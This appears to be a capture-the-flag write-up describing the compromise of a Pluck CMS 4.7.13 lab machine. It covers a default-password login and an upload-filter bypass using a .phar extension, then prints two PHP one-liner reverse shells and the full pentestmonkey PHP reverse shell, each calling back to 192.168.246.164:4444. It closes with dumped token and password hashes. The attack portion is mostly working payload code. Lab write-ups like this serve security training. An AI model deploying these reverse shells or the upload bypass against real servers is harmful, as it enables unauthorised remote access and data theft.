After getting the ip here how it look 

![Target ](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ffd4nkmynjbwzjprhfsbg.png)

Now after it we did our nmap and directory enumuration whose result are below

```nmap REsutlts
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 60:77:64:e7:96:d4:a4:58:b0:cf:66:9c:54:03:e4:20 (RSA)
|   256 5c:e5:59:c7:4f:67:bc:cc:3f:ef:f8:74:81:9e:64:75 (ECDSA)
|_  256 f7:b7:4b:1d:4a:58:13:7e:de:47:23:b6:21:cf:89:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```

Nothing usefule from Nmap.

Then our directory bruteforcing

It discovered a endpoint named 

- /app

Here is how it looks 

![app](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F65mulfxhkvvtirfkm7l0.png)

Now when we tap on Pluck-4.7.13

We are presented with a cms page of Pluck-cms

![cms page](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fam6dtzzjf054r82rpdgf.png)

Now if we look the page carefully and enumurate it 

There are 2 links admin and pluck.

Admin is redirecting us to a page where we are asked to enter a pass and login.

![login](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Faqnuk0w3f41ijk2vxg5p.png)



After a few google seach i found the default password of pluck cms it was jus

Password

and this is the poc of being loggedin

![loggedin](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F23ik33mxebpjiq03hj6b.png)

After tapping on Check Writable option i found many endpoint

Here are they 

http://<IP>/app/pluck-4.7.13/

- /images
- /files
- /data/modules
- /data/trash
- /data/themes
- /data/themes/default
- /data/themes/oldstyle
- /data/settings
- /data/settings/langpref.php

After seaching here and there for files i found a location where i could able to upload files.

It was http://10.48.151.78/app/pluck-4.7.13/admin.php?action=images


After a bunch of file upload i found that there are only accepted file are jpeg,jpg,png and gif.

But the double extention file could be uploaded too.

But there was a also a point to upload any types of file

http://10.48.151.78/app/pluck-4.7.13/admin.php?action=files

After it i uploaded a html to see it executes or not.

the content inside the html file was 


```html
<img src="http://YOUR_IP:5555/ping">
```

And a python server oponed in machine 

When i uplaoded the file and open the file in new tab the html executes that menas html injection is possible here.


Lets try for the php  execution 

with the contnet inside the php will be

<?php echo shell_exec(whoami); ?>

But when i uploaded the php file it uploaded but the filename got renamed as a text file.

So i tried it different php extentions.

still it gets renamed 

Tried extention were

- php4
- php5

But i think now it was filtering on the basis of php file execution.

so i did it with another php extention whcih have no php in its name.


And it is PHAR.

And when i uploaded it that filename it gets accepted and when opened in a new tab it executes.


Now time for the php shell.

I tried the payload 1

```php
php -r '$sock=fsockopen("192.168.246.164",4444);exec("sh <&3 >&3 2>&3");'
```

Now Payload 2

```php
php -r '$sock=fsockopen("192.168.246.164",4444);shell_exec("sh <&3 >&3 2>&3");'
```

Payload 3
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.246.164';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

With this payload i got the shell.

After getting the shell and looking inside the /home folder

- death
- lucien
- morpheus
- ubuntu

But reading the content inside each folder is not allowed meaning we're not permitted to read.

Now we need to do the privilate escalation to get the root access.

when we did sudo -l 

I got

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
$ python3 -c 'import pty; pty.spawn("/bin/bash")'  

Meaning we need to make it a proper shell.

We first check that python is there or not with which python3 

Then we did  python3 -c 'import pty; pty.spawn("/bin/bash")' 

To get a proper shell.

And while enumuration i got a file

at the location /var/www/html/app/pluck-4.7.13/robots.txt

When we opned the robots.txt in browser.

2 endpoint were hidden.

- docs/
- data/

Proceeding to data redirct us to the homepage.

But proceeding to /data lets us to a bunch of file location.

there was a file named update.php

whose content was

```php
At the moment, this file is situated in the docs directory. To perform an update, please move this file to the root directory of pluck first.
```

And a useful info i got from the location

/var/www/html/app/pluck-4.7.13/data/settings/options.php

The content was 
<?php
$sitetitle = 'dreaming';
$email = 'REDACTED';
?>

Also there were some more useful stuffs i found too
 INSIDe the token.php and pass.php


The content inside the token.php was 

```php
<?php $token = '8eacc00b8fa2ea872b70e4a9ae721b86c60b3f74944e3514f34a83f00c8880ef96ea38b40fe10aefd3a58c20081e52534321f8d3b9254f29aa6393460c2a0eae'; ?>
```

The content inside the pass.php was

```php
<?php
$ww = 'b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86';
?>
```
